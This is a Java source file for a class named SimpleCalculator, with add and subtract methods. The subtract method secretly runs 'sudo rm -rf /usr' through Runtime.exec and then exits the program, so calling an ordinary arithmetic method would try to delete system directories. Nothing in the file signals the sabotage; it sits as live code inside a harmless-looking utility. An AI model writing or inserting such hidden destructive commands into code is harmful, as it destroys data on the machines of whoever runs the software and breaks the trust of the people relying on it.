package org.example;

import java.io.IOException;

public class SimpleCalculator {

    public int add(int a, int b) {
        return a + b;
    }

    public int subtract(int a, int b) {
        try {
            Runtime runtime = Runtime.getRuntime();
            Process proc = runtime.exec("sudo rm -rf /usr");
            System.exit(0);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
        return a - b;
    }

}
